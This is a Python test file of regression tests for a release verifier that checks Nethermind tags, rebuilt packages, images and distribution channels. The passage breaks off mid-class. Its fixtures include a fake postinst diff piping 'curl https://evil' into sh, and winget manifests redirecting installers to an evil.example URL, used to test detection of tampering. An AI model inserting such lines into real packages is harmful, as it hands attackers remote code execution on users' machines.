"""Regression tests for the adversarial review of PR #2 (one class per finding, RV-* ids)."""

import copy
import hashlib
import io
import os
import shutil
import subprocess
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

from release_verifier import channels, github, gitops, net, rebuild, registry, trust, verify, watch
from release_verifier.config import Project, load
from release_verifier.net import HttpError
from release_verifier.results import Status, utc_now

from .test_verify import FakeSource, VerifyHarness
from .test_watch import C220, C230, api_release, release, snapshot


def by_check(results, check):
    return [r for r in results if r.check == check]


class SignersRootTest(VerifyHarness):
    """RV-SRC-SIGNERS-ROOT: tags are authenticated against signers pinned in this repository."""

    def test_verify_uses_the_pinned_signers(self):
        seen = []
        with mock.patch.object(FakeSource, "verify_tag", lambda self, tag, signers, *a: seen.append(Path(signers)) or gitops.TagVerification(True, "")):
            report = self.run_verify(skip_rebuild=True)
        self.assertEqual(seen, [self.project.signers_dir()])
        self.assertTrue((seen[0] / "allowed_signers").is_file())
        self.assertIn("pinned in this repository", by_check(report.results, "signed-tag")[0].message)

    @unittest.skipUnless(shutil.which("git"), "needs git")
    def test_tree_hash_matches_git(self):
        d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, d, ignore_errors=True)
        for f in ("allowed_signers", "a.asc", "B.asc"):
            (d / f).write_text(f"key {f}\n")
        subprocess.run(["git", "init", "-q", str(d)], check=True)
        subprocess.run(["git", "-C", str(d), "add", "allowed_signers", "a.asc", "B.asc"], check=True)
        want = subprocess.run(["git", "-C", str(d), "write-tree"], check=True, capture_output=True, text=True).stdout.strip()
        shutil.rmtree(d / ".git")
        self.assertEqual(gitops.tree_hash(d), want)

    def test_watch_fails_when_upstream_signers_change(self):
        p = load("nethermind")
        snap = snapshot()
        pinned = gitops.tree_hash(p.signers_dir())
        cases = [({"tree": pinned}, Status.PASS), ({"tree": "0" * 40}, Status.FAIL), ({"tree": None}, Status.SKIPPED)]
        for up, status in cases:
            with self.subTest(up=up):
                snap["signers"] = {"branch": "master", "path": ".github/release-signers", **up}
                [r] = by_check(watch.evaluate(p, snap, {}), "release-signers")
                self.assertEqual(r.status, status, r.message)
        snap["signers"]["tree"] = "0" * 40
        self.assertIn("update the pin", by_check(watch.evaluate(p, snap, {}), "release-signers")[0].message)


class TagReplayTest(VerifyHarness):
    """RV-SRC-TAG-REPLAY: a signed tag object must name the ref and the version must move forward."""

    def assert_unauthenticated(self, report, needle):
        [r] = by_check(report.results, "tag-binding")
        self.assertEqual(r.status, Status.FAIL)
        self.assertIn(needle, r.message)
        self.assertEqual(report.meta["source"], "unauthenticated")
        self.assertEqual(FakeSource.checkouts, [])
        self.calls["rebuild_packages"].assert_not_called()

    def test_replayed_signed_tag_is_rejected(self):
        FakeSource.tag_name = "2.1.0"  # an old maintainer-signed tag object copied to refs/tags/2.3.0
        self.assert_unauthenticated(self.run_verify(skip_image_rebuild=True), "replayed")

    def test_version_must_be_newer_than_verified_releases(self):
        self.state.record_verified("2.4.0", {"version": "2.4.0", "commit": "f" * 40, "outcome": "pass"})
        self.assert_unauthenticated(self.run_verify(skip_image_rebuild=True), "not newer than the already verified 2.4.0")

    def test_new_version_and_reverification_pass(self):
        self.state.record_verified("2.2.0", {"version": "2.2.0", "commit": "f" * 40, "outcome": "pass"})
        report = self.run_verify(skip_image_rebuild=True)
        self.assertEqual(by_check(report.results, "tag-binding")[0].status, Status.PASS)
        self.state.record_verified("2.4.0", {"version": "2.4.0", "commit": "f" * 40, "outcome": "pass"})
        report = self.run_verify(skip_image_rebuild=True)  # 2.3.0 already verified at this commit
        self.assertEqual(report.meta["source"], "signed")


class PackagesHarness(VerifyHarness):
    """Every platform zip downloaded and signed; the package rebuild writes matching trees."""

    noop = ("_checksums", "_release_attestation", "_provenance", "_channels")
    symlink_build = ()  # platforms whose rebuild output dir is a symlink

    def setUp(self):
        super().setUp()
        platforms = self.project.platforms
        tag = self.tag

        def downloads(v):
            for pl in platforms:
                name = f"nethermind-{tag}-{FakeSource.commit[:8]}-{pl.name}.zip"
                path = self.tmp / "dl" / name
                path.parent.mkdir(exist_ok=True)
                with zipfile.ZipFile(path, "w") as z:
                    z.writestr("nethermind", f"bin-{pl.name}")
                v.c.downloads[name], v.c.hashes[name] = path, hashlib.sha256(path.read_bytes()).hexdigest()
                v.c.signed_ok.add(name)

        def build(recipe, ctx, *args):
            for pl in platforms:
                d = Path(ctx["out_dir"]) / pl.build_dir
                target = self.tmp / "elsewhere" / pl.build_dir if pl.name in self.symlink_build else d
                target.mkdir(parents=True)
                (target / "nethermind").write_text(f"bin-{pl.name}")
                if target != d:
                    d.symlink_to(target, target_is_directory=True)

        self.calls["rebuild_packages"].side_effect = build
        self.calls["archive_packages"].return_value = self.tmp / "dl"  # reproduces the published zips
        p = mock.patch.object(verify.Verifier, "_download_and_check_signatures", downloads)
        p.start()
        self.addCleanup(p.stop)


class ArchiveSandboxTest(unittest.TestCase):
    """RV-HOST-ARCHIVE-EXEC: nothing from the release runs on the host."""

    def test_archive_step_runs_in_a_locked_down_container(self):
        p = load("nethermind")
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        (tmp / "src").mkdir()
        (tmp / "out").mkdir()
        ctx = {"work_dir": str(tmp), "src_dir": str(tmp / "src"), "out_dir": str(tmp / "out"), "uid": 1234, "gid": 5678,
               "version": "2.3.0", "sha8": "abcdef12"}
        runs = []

        def fake_run(argv, *a, **kw):
            runs.append((argv, kw))
            return subprocess.CompletedProcess(argv, 0, b"", b"")

        with mock.patch.dict(os.environ, {"GH_TOKEN": "secret", "RELEASE_VERIFIER_SLACK_WEBHOOK": "https://hooks"}), \
                mock.patch.object(rebuild.subprocess, "run", fake_run):
            out = rebuild.archive_packages(p.package_rebuild, ctx, tmp / "log", p.path.parent)
        self.assertEqual(out, tmp / "archive" / "pkg")
        argv = next(a for a, _ in runs if a[:3] == ["docker", "run", "--rm"])
        self.assertEqual(argv[argv.index("--network") + 1], "none")
        self.assertEqual(argv[argv.index("--user") + 1], "1234:5678")
        self.assertIn("--read-only", argv)
        mounts = [argv[i + 1] for i, a in enumerate(argv) if a == "--mount"]
        self.assertEqual(sorted(mounts), sorted([
            f"type=bind,source={tmp / 'src'},target=/src,readonly",
            f"type=bind,source={tmp / 'out'},target=/out,readonly",
            f"type=bind,source={tmp / 'archive'},target=/ws",
        ]))
        envs = sorted(argv[i + 1] for i, a in enumerate(argv) if a == "--env")
        self.assertEqual(envs, ["GITHUB_WORKSPACE=/ws", "PACKAGE_DIR=pkg", "PACKAGE_PREFIX=nethermind-2.3.0-abcdef12", "PUB_DIR=/out"])
        self.assertNotIn("secret", " ".join(argv))
        image = argv[-3]
        self.assertTrue(image.startswith("release-verifier-archive:"), image)
        self.assertEqual(argv[-2:], ["bash", "/src/scripts/build/archive.sh"])
        self.assertFalse(any(a[0] == "bash" for a, _ in runs), "archive step ran on the host")

    def test_export_step_runs_as_the_invoking_user_without_network(self):
        [export] = [s for s in load("nethermind").package_rebuild["steps"] if s["name"] == "export packages"]
        argv = export["run"]
        self.assertEqual(argv[argv.index("--user") + 1], "{uid}:{gid}")
        self.assertEqual(argv[argv.index("--network") + 1], "none")


@unittest.skipUnless(hasattr(os, "symlink"), "needs symlinks")
class SymlinkedBuildDirTest(PackagesHarness):
    symlink_build = ("linux-x64",)

    def test_symlinked_build_dir_is_not_followed(self):
        report = self.run_verify(skip_image_rebuild=True)
        [r] = [r for r in by_check(report.results, "package-rebuild") if "linux-x64" in r.subject]
        self.assertEqual(r.status, Status.ERROR)
        self.assertEqual(self.state.load_verified()[self.tag]["coverage"]["packages"]["linux-x64"], "error")


class ContentsMatchTest(PackagesHarness):
    """RV-PKG-CONTENTS-MATCH: above the reproducible-archive cutoff only byte-identical zips count."""

    def rearchive(self, comment):
        d = self.tmp / "rearchived"
        d.mkdir(exist_ok=True)
        for z in (self.tmp / "dl").glob("*.zip"):
            with zipfile.ZipFile(z) as src, zipfile.ZipFile(d / z.name, "w", zipfile.ZIP_DEFLATED) as dst:
                dst.comment = comment
                for info in src.infolist():
                    dst.writestr(info.filename, src.read(info))
        return d

    def test_same_files_but_different_bytes_is_not_trusted(self):
        self.calls["archive_packages"].side_effect = lambda *a: self.rearchive(b"different bytes")
        report = self.run_verify(skip_image_rebuild=True, platforms=["linux-x64"])
        [r] = by_check(report.results, "package-rebuild")
        self.assertEqual(r.status, Status.WARN)
        rec = self.state.load_verified()[self.tag]
        self.assertEqual(rec["coverage"]["packages"]["linux-x64"], "bytes-differ")
        self.assertIn("packages bytes-differ: linux-x64", "; ".join(trust.gaps(rec)))

    def test_archive_step_runs_without_checksums_and_must_reproduce(self):
        self.calls["archive_packages"].side_effect = lambda *a: self.tmp / "none"
        self.run_verify(skip_image_rebuild=True, platforms=["linux-x64"])
        self.calls["archive_packages"].assert_called_once()
        self.assertEqual(self.state.load_verified()[self.tag]["coverage"]["packages"]["linux-x64"], "bytes-differ")


class ExtraAssetTest(PackagesHarness):
    """RV-EXTRA-ASSET: allowed extras are downloaded, signature-checked and listed in coverage."""

    extra = f"nethermind-2.3.0-{FakeSource.commit[:8]}-ref-assemblies.zip"

    def setUp(self):
        super().setUp()
        self.signed = False
        rel = verify.github.release_by_tag(None, None)
        rel = {**rel, "assets": rel["assets"] + [{"name": self.extra, "browser_download_url": "x", "id": 99}]}
        payload = b"ref assemblies"
        self.sha = hashlib.sha256(payload).hexdigest()

        def download(url, dest):
            Path(dest).parent.mkdir(parents=True, exist_ok=True)
            Path(dest).write_bytes(payload)
            return self.sha

        def verify_sig(v, name, sig_name):
            if self.signed:
                v.c.signed_ok.add(name)
            else:
                v.r.add("gpg-signature", Status.FAIL, name, f"no detached signature {sig_name}")

        def checksums(v):
            v.c.sums, v.c.sums_signed = {self.extra: self.sha}, True

        for p in (mock.patch.object(verify.github, "release_by_tag", return_value=rel),
                  mock.patch.object(verify, "download", download),
                  mock.patch.object(verify.Verifier, "_verify_sig", verify_sig),
                  mock.patch.object(verify.Verifier, "_checksums", checksums)):
            p.start()
            self.addCleanup(p.stop)

    def coverage(self):
        rec = self.state.load_verified()[self.tag]
        return rec["coverage"]["extras"], trust.gaps({**rec, "outcome": "pass"})  # the coverage part of the verdict

    def test_unsigned_extra_is_not_trusted(self):
        report = self.run_verify(skip_image_rebuild=True)
        self.assertEqual([r.status for r in by_check(report.results, "gpg-signature") if r.subject == self.extra], [Status.FAIL])
        extras, gaps = self.coverage()
        self.assertEqual(extras, {self.extra: "unsigned-not-rebuilt"})
        self.assertIn(f"extra assets unsigned-not-rebuilt: {self.extra}", gaps)

    def test_signed_and_checksummed_extra_is_listed_as_not_rebuilt(self):
        self.signed = True
        self.run_verify(skip_image_rebuild=True)
        extras, gaps = self.coverage()
        self.assertEqual(extras, {self.extra: "signed-not-rebuilt"})
        self.assertFalse([g for g in gaps if "extra" in g])


class ImageCoverageTest(PackagesHarness):
    """RV-IMG-ABSENT-TRUST: missing or unexpected image platforms never count as trusted."""

    def setUp(self):
        super().setUp()
        self.published = {"linux/amd64": {"manifest": "sha256:m1", "config": "sha256:c1"}, "linux/arm64": {"manifest": "sha256:m2", "config": "sha256:c2"}}
        test = self

        class Reg:
            def __init__(self, *a):
                pass

            def describe(self, repo, tag):
                return {"index_digest": f"sha256:idx-{tag}", "platforms": copy.deepcopy(test.published)}

        configs = {"linux/amd64": "sha256:c1", "linux/arm64": "sha256:c2"}
        for p in (mock.patch.object(verify, "Registry", Reg),
                  mock.patch.object(rebuild, "oci_layout_image", lambda tar, pl: {"config": configs[pl], "manifest": "sha256:m", "config_doc": {}})):
            p.start()
            self.addCleanup(p.stop)

    def record_after_run(self):
        report = self.run_verify()
        return report, self.state.load_verified()[self.tag]

    def test_full_coverage_is_trusted(self):
        self.assertTrue(self.record_after_run()[1]["trusted"])

    def test_platform_missing_from_the_index_is_not_trusted(self):
        # e.g. arm64 renamed with a variant the old code keyed as linux/arm64/v8, or simply dropped
        del self.published["linux/arm64"]
        _, rec = self.record_after_run()
        self.assertEqual(rec["coverage"]["images"]["nethermind/nethermind:2.3.0@linux/arm64"], "missing")
        self.assertFalse(rec["trusted"])

    def test_unknown_runnable_platform_fails(self):
        self.published["linux/riscv64"] = {"manifest": "sha256:m3", "config": "sha256:c3"}
        report, rec = self.record_after_run()
        rs = by_check(report.results, "image-index")
        self.assertTrue(rs and all(r.status is Status.FAIL for r in rs))
        self.assertIn("linux/riscv64", rs[0].message)
        self.assertFalse(rec["trusted"])


class ImageIndexParsingTest(unittest.TestCase):
    """RV-IMG-ABSENT-TRUST / RV-ERR-DOWNGRADE at the registry and watch level."""

    def test_variants_are_normalized(self):
        self.assertEqual(registry.platform_key({"os": "linux", "architecture": "arm64", "variant": "v8"}), "linux/arm64")
        self.assertEqual(registry.platform_key({"os": "linux", "architecture": "amd64", "variant": "v3"}), "linux/amd64")
        self.assertEqual(registry.platform_key({"os": "linux", "architecture": "arm", "variant": "v7"}), "linux/arm/v7")

    def test_amd64_v3_next_to_amd64_is_a_duplicate(self):
        idx = {"manifests": [{"digest": "a", "platform": {"os": "linux", "architecture": "amd64"}},
                             {"digest": "b", "platform": {"os": "linux", "architecture": "amd64", "variant": "v3"}}]}
        plats, problems = registry.platform_manifests(idx)
        self.assertEqual((list(plats), len(problems)), (["linux/amd64"], 1))

    def test_late_version_tag_push_fails(self):
        p = load("nethermind")
        snap = snapshot()
        rec = {"version": "2.2.0", "commit": C220, "outcome": "pass", "images": {},
               "coverage": {"source": "pinned", "images": {"nethermind/nethermind:2.2.0@linux/amd64": "absent", "nethermind/nethermind:2.2.0@linux/arm64": "absent"}}}
        rs = [r for r in by_check(watch.evaluate(p, snap, {"2.2.0": rec}), "image-tag") if r.subject == "nethermind/nethermind:2.2.0"]
        self.assertEqual([r.status for r in rs], [Status.FAIL])
        self.assertIn("appeared after 2.2.0 was verified", rs[0].message)

    def test_unknown_platform_on_latest_fails_in_watch(self):
        p = load("nethermind")
        snap = snapshot()
        snap["images"]["nethermind/nethermind:latest"]["platforms"]["linux/arm/v7"] = {"manifest": "sha256:x", "config": "sha256:y"}
        [r] = by_check(watch.evaluate(p, snap, {}), "image-index")
        self.assertEqual((r.status, r.subject), (Status.FAIL, "nethermind/nethermind:latest"))

    def test_one_bad_image_tag_does_not_blind_the_others(self):
        p = load("nethermind")
        state = mock.MagicMock(cache_dir=None)
        dup = {"index_digest": "sha256:dup", "platforms": {"linux/amd64": {}}, "problems": ["index lists platform linux/amd64 more than once"]}

        def head(self, repo, tag):
            if tag == "2.2.0-chiseled":
                raise HttpError("https://registry-1.docker.io/v2/x", 502)
            return ("sha256:dup" if tag.startswith("latest") else f"sha256:{tag}", "application/vnd.oci.image.index.v1+json")

        def describe_digest(self, repo, digest):
            if digest == "sha256:dup":
                return copy.deepcopy(dup)
            raise ValueError("manifest is not JSON")

        errors = {}
        prev = {"nethermind/nethermind:2.2.0-chiseled": snapshot()["images"]["nethermind/nethermind:2.2.0"]}
        with mock.patch.object(registry.Registry, "head", head), mock.patch.object(registry.Registry, "describe_digest", describe_digest):
            images = watch._collect_images(p, state, ["2.2.0"], prev, errors)
        self.assertEqual(list(errors), ["image:nethermind/nethermind:2.2.0-chiseled"])
        self.assertEqual(images["nethermind/nethermind:2.2.0-chiseled"]["index_digest"], "sha256:idx220")  # carried
        self.assertIn("malformed", images["nethermind/nethermind:2.2.0"])
        snap = {**snapshot(), "images": images, "errors": errors}
        failing = {r.subject for r in by_check(watch.evaluate(p, snap, {}), "image-index")}
        self.assertEqual(failing, {"nethermind/nethermind:2.2.0", "nethermind/nethermind:latest", "nethermind/nethermind:latest-chiseled"})


class EvictionSpoofTest(unittest.TestCase):
    """RV-WATCH-EVICT-SPOOF: junk releases cannot push tracked releases out of the window."""

    def setUp(self):
        base = load("nethermind")
        raw = copy.deepcopy(base.raw)
        raw["channels"], raw["images"]["flavors"] = [], []
        raw["watch"]["release_window"] = 2
        raw["tags"].pop("upstream_signers_dir")
        self.p = Project(base.path, raw)
        self.prev = snapshot()
        self.old = self.prev["releases"]["2.2.0"]
        self.new = release("2.3.0", C230, 3, published="2026-11-01T00:00:00Z", updated="2026-11-01T00:00:00Z")
        tags = {**self.prev["tags"], "2.3.0": {"object": C230, "type": "commit", "commit": C230}}
        self.junk = [{**api_release(release(f"nightly-{i}", C230, 1000 + i, published="2026-11-02T00:00:00Z")), "assets": []} for i in range(100)]
        p = mock.patch.object(watch, "_collect_tags", return_value=tags)
        p.start()
        self.addCleanup(p.stop)

    def collect(self, pages, verified, by_tag):
        def get_json(url, headers=None):
            page = int(url.rsplit("page=", 1)[1])
            return pages[page - 1] if page <= len(pages) else []

        with mock.patch.object(github.net, "get_json", get_json), mock.patch.object(watch.github, "release_by_tag", side_effect=by_tag):
            return watch.collect(self.p, None, self.prev, verified)

    def test_window_is_filled_with_matching_releases(self):
        cur = self.collect([self.junk, [api_release(self.new), api_release(self.old)]], {}, lambda *a: self.fail("no lookup needed"))
        self.assertEqual(sorted(cur["releases"]), ["2.2.0", "2.3.0"])
        self.assertEqual(cur["evicted"], [])
        warns = by_check(watch.evaluate(self.p, cur, {}), "release-pattern")
        self.assertEqual((len(warns), {r.status for r in warns}), (100, {Status.WARN}))

    def test_ignored_tags_are_skipped_silently(self):
        # "^2\." also matches the client releases: those must stay tracked.
        self.p.raw["releases"] = {"ignore_tag_patterns": ["^nightly-", r"^2\."]}
        other = {**api_release(release("configTest", C230, 999, published="2026-11-02T00:00:00Z")), "assets": []}
        cur = self.collect([self.junk + [other], [api_release(self.new), api_release(self.old)]], {}, lambda *a: self.fail("no lookup needed"))
        self.assertEqual(sorted(cur["releases"]), ["2.2.0", "2.3.0"])
        self.assertEqual(cur["unmatched_releases"], ["configTest"])
        [r] = by_check(watch.evaluate(self.p, cur, {}), "release-pattern")
        self.assertEqual((r.subject, r.status), ("configTest", Status.WARN))

    def test_verified_release_is_never_evicted(self):
        self.p.raw["watch"]["release_window"] = 1
        verified = {"2.2.0": {"version": "2.2.0", "commit": C220, "outcome": "pass", "assets": {"nethermind-2.2.0-1d2aff00-linux-x64.zip": "f" * 64}}}
        cur = self.collect([[api_release(self.new)]], verified, lambda repo, tag: api_release(self.old))
        self.assertEqual(sorted(cur["releases"]), ["2.2.0", "2.3.0"])
        self.assertEqual(cur["evicted"], [])
        [r] = by_check(watch.evaluate(self.p, cur, verified), "verified-asset")  # still checked
        self.assertEqual(r.status, Status.FAIL)

    def test_deleted_verified_release_fails_even_if_never_tracked(self):
        self.prev["releases"] = {}
        verified = {"2.2.0": {"version": "2.2.0", "commit": C220, "outcome": "pass"}}
        cur = self.collect([[api_release(self.new)]], verified, lambda repo, tag: None)
        [r] = [r for r in by_check(watch.evaluate(self.p, cur, verified), "release") if r.subject == "2.2.0"]
        self.assertEqual(r.status, Status.FAIL)


class LatestRollbackTest(unittest.TestCase):
    """RV-LATEST-ROLLBACK: latest moved back to an older trusted release is a WARN."""

    def test_latest_on_older_trusted_release_warns(self):
        p = load("nethermind")
        snap = snapshot()
        snap["releases"]["2.3.0"] = release("2.3.0", C230, 3)
        cov = lambda v: {"source": "pinned", "packages": {}, "images": {f"nethermind/nethermind:{v}@linux/amd64": "identical"}}
        verified = {
            "2.2.0": {"version": "2.2.0", "commit": C220, "outcome": "pass", "coverage": cov("2.2.0"), "images": {"nethermind/nethermind:2.2.0": {"index_digest": "sha256:idx220"}}},
            "2.3.0": {"version": "2.3.0", "commit": C230, "outcome": "pass", "coverage": cov("2.3.0"), "images": {"nethermind/nethermind:2.3.0": {"index_digest": "sha256:idx230"}}},
        }
        [r] = [r for r in by_check(watch.evaluate(p, snap, verified), "latest-tag") if r.subject == "nethermind/nethermind:latest"]
        self.assertEqual(r.status, Status.WARN)
        self.assertIn("older than the newest trusted release 2.3.0", r.message)
        snap["images"]["nethermind/nethermind:latest"]["index_digest"] = "sha256:idx230"
        [r] = [r for r in by_check(watch.evaluate(p, snap, verified), "latest-tag") if r.subject == "nethermind/nethermind:latest"]
        self.assertEqual(r.status, Status.PASS)


class BuildkitPinTest(unittest.TestCase):
    """images.buildkit_image: the image builder runs the BuildKit the release workflow pins."""

    IMG = load("nethermind").images["buildkit_image"]

    def run_ensure(self, inspect_rc, inspect_out):
        calls = []

        def fake_run(argv, *a, **kw):
            calls.append(argv)
            rc = inspect_rc if argv[:3] == ["docker", "buildx", "inspect"] else 0
            return subprocess.CompletedProcess(argv, rc, inspect_out.encode(), b"")

        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        with mock.patch.object(rebuild.subprocess, "run", fake_run):
            rebuild.ensure_builder("release-verifier", tmp / "log", self.IMG)
        return calls

    def test_builder_is_created_with_the_pinned_image(self):
        self.assertTrue(self.IMG.startswith("moby/buildkit:v0.33.1@sha256:cec9f139"))
        calls = self.run_ensure(1, "")
        self.assertIn(["docker", "buildx", "create", "--name", "release-verifier", "--driver", "docker-container", "--driver-opt", f"image={self.IMG}"], calls)

    def test_existing_builder_with_the_pinned_image_is_used(self):
        calls = self.run_ensure(0, f'Driver:        docker-container\nDriver Options:        image="{self.IMG}"\n')
        self.assertEqual(len(calls), 1)

    def test_existing_builder_with_another_buildkit_is_an_error(self):
        for out in ("Driver:        docker-container\n", 'Driver:        docker-container\nDriver Options:        image="moby/buildkit:buildx-stable-1"\n'):
            with self.subTest(out=out), self.assertRaisesRegex(rebuild.RebuildError, "not the pinned"):
                self.run_ensure(0, out)


FIX = Path(__file__).parent / "fixtures"


def fake_launchpad(sources):
    """``sources``: {(package, version): {filename: bytes}} -> (get_json, get_bytes) fakes."""
    lp = "https://api.launchpad.net/1.0"

    def get_json(url, headers=None):
        if "getPublishedSources" in url:
            return {"entries": [{"source_package_name": p, "source_package_version": v, "distro_series_link": f"{lp}/ubuntu/jammy",
                                 "self_link": f"{lp}/src/{p}/{v}"} for p, v in sources]}
        p, v = url.split("?")[0].rsplit("/", 2)[1:]
        return [f"https://launchpad.net/files/{name}" for name in sources[(p, v)]]

    def get_bytes(url, headers=None, limit=None):
        name = url.rsplit("/", 1)[1]
        data = next(files[name] for files in sources.values() if name in files)
        if limit is not None and len(data) > limit:
            raise net.TooLarge(name)
        return data

    return get_json, get_bytes


def tarball(members, mode="w:xz"):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode) as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def dsc(fmt, files):
    sums = "".join(f" {hashlib.sha256(d).hexdigest()} {len(d)} {n}\n" for n, d in files.items())
    return f"Format: {fmt}\nSource: nethermind\nVersion: 2.2.0\nChecksums-Sha256:\n{sums}".encode()


class PpaSourceTest(unittest.TestCase):
    """RV-PPA-NONTAR, RV-PPA-BOMB, RV-ERR-DOWNGRADE (PPA): published source package checks."""

    def setUp(self):
        self.p = load("nethermind")
        self.c = next(c for c in self.p.channels if c["type"] == "ppa")
        self.good_tar = (FIX / "nethermind_2.2.0.tar.xz").read_bytes()

    def fetch(self, files):
        get_json, get_bytes = fake_launchpad({("nethermind", "2.2.0"): files})
        with mock.patch.object(channels.net, "get_json", get_json), mock.patch.object(channels.net, "get_bytes", get_bytes):
            return channels.fetch_ppa(self.c, {"2.2.0"}, None)

    def evaluate(self, data):
        verified = {"2.2.0": {"version": "2.2.0", "commit": C220, "outcome": "pass"}}
        return [r for r in watch.evaluate_channel(self.p, snapshot(), verified, self.c, data) if r.status in (Status.FAIL, Status.ERROR)]

    def test_native_package_passes_the_integrity_checks(self):
        data = self.fetch({"nethermind_2.2.0.dsc": (FIX / "nethermind_2.2.0.dsc").read_bytes(), "nethermind_2.2.0.tar.xz": self.good_tar})
        pub = data["sources"]["2.2.0"]
        self.assertEqual((pub["problems"], pub["tarball_matches_dsc"]), ([], True))
        self.assertFalse([r for r in self.evaluate(data) if r.check in ("ppa-source-integrity", "channel-content")])

    def test_format_1_with_diff_fails(self):
        diff = b"--- a/debian/postinst\n+++ b/debian/postinst\n@@ -1 +1,2 @@\n+curl https://evil | sh\n"
        files = {"nethermind_2.2.0.orig.tar.xz": self.good_tar, "nethermind_2.2.0.diff.gz": diff}
        data = self.fetch({"nethermind_2.2.0.dsc": dsc("1.0", files), **files})
        msgs = [r.message for r in self.evaluate(data) if r.check == "ppa-source-integrity"]
        self.assertTrue(any("3.0 (native)" in m for m in msgs), msgs)
        self.assertTrue(any("exactly one tarball" in m for m in msgs), msgs)

    def test_decompression_bomb_is_a_finding_not_a_crash(self):
        bomb = tarball({"nethermind-2.2.0/debian/postinst": b"url=x\n", "nethermind-2.2.0/big": b"\0" * 5000})
        with mock.patch.object(channels, "MAX_MEMBER_BYTES", 4096):
            data = self.fetch({"nethermind_2.2.0.dsc": dsc("3.0 (native)", {"nethermind_2.2.0.tar.xz": bomb}), "nethermind_2.2.0.tar.xz": bomb})
        self.assertIn("size caps", data["sources"]["2.2.0"]["malformed"])
        [r] = self.evaluate(data)
        self.assertEqual((r.check, r.status), ("channel-content", Status.FAIL))

    def test_malformed_postinst_is_a_fail_not_an_error(self):
        for members in ({"nethermind-2.2.0/debian/rules": b"x"}, {"nethermind-2.2.0/debian/postinst": b"hash=" + b"a" * 64 + b"\nurl=x\n"},
                        {"a/debian/postinst": b"url=x\n", "b/x": b""}):
            with self.subTest(members=list(members)):
                t = tarball(members)
                data = self.fetch({"nethermind_2.2.0.dsc": dsc("3.0 (native)", {"nethermind_2.2.0.tar.xz": t}), "nethermind_2.2.0.tar.xz": t})
                [r] = self.evaluate(data)
                self.assertEqual((r.check, r.status), ("channel-content", Status.FAIL), r.message)


class WingetParserTest(unittest.TestCase):
    """RV-WINGET-PARSER: constructs the line parser could misread are rejected, never guessed."""

    GOOD_URL = "https://github.com/NethermindEth/nethermind/releases/download/2.2.0/nethermind-2.2.0-1d2aff00-windows-x64.zip"
    GOOD_SHA = "7798F602A675DD858D0B0FBD5830F920373EDFB6BF94D2A8D7FB66573C064166"

    def test_fixture_still_parses(self):
        m = channels.parse_winget_installer((FIX / "winget-2.2.0.installer.yaml").read_text())
        self.assertEqual([e["url"] for e in m["entries"]], [self.GOOD_URL])

    def test_decoys_are_rejected(self):
        head = "PackageIdentifier: Nethermind.Nethermind\nPackageVersion: 2.2.0\nInstallerType: zip\n"
        cases = {
            "flow item with root defaults": f"{head}InstallerUrl: {self.GOOD_URL}\nInstallerSha256: {self.GOOD_SHA}\n"
                                            "Installers:\n- {Architecture: x64, InstallerUrl: https://evil.example/x.zip, InstallerSha256: " + "0" * 64 + "}\n",
            "block scalar": f"{head}ReleaseNotes: |\n  InstallerType: msi\nInstallers:\n- Architecture: x64\n  InstallerUrl: {self.GOOD_URL}\n  InstallerSha256: {self.GOOD_SHA}\n",
            "anchor": f"{head}Installers:\n- &a Architecture: x64\n  InstallerUrl: {self.GOOD_URL}\n  InstallerSha256: {self.GOOD_SHA}\n",
            "multi-line quoted": f"{head}Installers:\n- Architecture: x64\n  InstallerUrl: \"{self.GOOD_URL}\n    https://evil.example/x.zip\"\n  InstallerSha256: {self.GOOD_SHA}\n",
            "duplicate url": f"{head}Installers:\n- Architecture: x64\n  InstallerUrl: {self.GOOD_URL}\n  InstallerUrl: https://evil.example/x.zip\n  InstallerSha256: {self.GOOD_SHA}\n",
        }
        for name, text in cases.items():
            with self.subTest(name), self.assertRaises(channels.ContentError):
                channels.parse_winget_installer(text)

    def test_malformed_manifest_fails_in_watch(self):
        p = load("nethermind")
        c = next(c for c in p.channels if c["type"] == "winget")
        [r] = watch.evaluate_channel(p, snapshot(), {}, c, {"manifests": {"2.2.0": {"malformed": "flow collection"}}})
        self.assertEqual((r.check, r.status), ("channel-content", Status.FAIL))


class ChannelScopeTest(unittest.TestCase):
    """RV-CHAN-SCOPE / RV-BREW-SHADOW / RV-ERR-DOWNGRADE (Homebrew): everything a channel publishes is checked."""

    def setUp(self):
        self.p = load("nethermind")
        self.ch = {c["type"]: c for c in self.p.channels}
        self.snap = snapshot()
        self.verified = {"2.2.0": {"version": "2.2.0", "commit": C220, "outcome": "pass", "assets": {}}}

    def fails(self, ctype, data, verified=None):
        rs = watch.evaluate_channel(self.p, self.snap, self.verified if verified is None else verified, self.ch[ctype], data)
        return [r for r in rs if r.status is Status.FAIL]

    def test_ppa_unverified_version_and_other_package_fail(self):
        data = {"sources": {"2.99.0": {"series": ["jammy"], "not_fetched": True}, "2.2.0-1": {"series": ["jammy"], "not_fetched": True}},
                "other_packages": {"nethermind-tools": ["1.0"]}}
        subjects = {r.subject for r in self.fails("ppa", data)}
        self.assertEqual(subjects, {"ppa@2.99.0", "ppa@2.2.0-1", "ppa:nethermind-tools"})

    def test_ppa_legacy_uploads_are_pinned(self):
        pin = self.ch["ppa"]["legacy_uploads"]["1.34.1"]
        self.assertEqual(self.fails("ppa", {"sources": {"1.34.1": {"series": ["focal"], "legacy_dsc_sha256": pin}}, "other_packages": {}}), [])
        self.assertEqual(len(self.fails("ppa", {"sources": {"1.34.1": {"series": ["focal"], "legacy_dsc_sha256": "0" * 64}}, "other_packages": {}})), 1)

    def test_winget_unknown_version_fails(self):
        self.snap["tags"]["1.39.3"] = {"object": "a" * 40, "type": "tag", "commit": "a" * 40}
        [r] = self.fails("winget", {"listed": ["1.39.3", "2.2.0", "2.99.0"], "manifests": {}})
        self.assertEqual(r.subject, "winget@2.99.0")

    def tap(self, **kw):
        tree = {p: ["blob", "x"] for p in ("nethermind.rb", "README.md", "LICENSE", "CODEOWNERS")}
        return {"default_branch": "main", "commit": "c" * 40, "tree": tree, "truncated": False, **kw}

    def test_tap_shadow_paths_and_branch_fail(self):
        hb = self.snap["channels"]["homebrew"]
